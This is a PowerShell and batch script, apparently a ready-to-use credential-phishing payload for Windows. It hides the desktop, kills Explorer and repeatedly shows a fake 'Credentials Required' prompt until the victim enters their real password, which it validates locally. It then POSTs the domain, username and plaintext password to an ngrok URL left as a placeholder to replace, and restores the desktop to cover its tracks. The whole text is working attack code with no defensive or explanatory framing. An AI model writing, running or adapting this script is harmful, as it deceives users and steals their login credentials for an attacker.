
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe

$ngrokServer = "http://e7fd536c.ngrok.io/index.php"   #Replace link here

[int]$cnt = 1
while ( $cnt -lt '1000000000' ) {
 
	$user    = [Environment]::UserName
	$domain  = [Environment]::UserDomainName

	

        Add-Type -assemblyname System.Windows.Forms
	Add-Type -assemblyname System.DirectoryServices.AccountManagement 
	$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
	
        $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
        $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $c, "NetBiosUserName")
        $creds = $DS.ValidateCredentials($c, $credential.GetNetworkCredential().password)


	if ($creds -eq $false) {
	    $choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
	}		

        else {
            $user = $credential.GetNetworkCredential().username;
            $pass = $credential.GetNetworkCredential().password;
            $username = "username: ";
	    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $username$domain"\"$user" password: "$pass -ErrorAction Ignore
            REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
            start explorer.exe
	    exit
        
	}

	$cnt++
}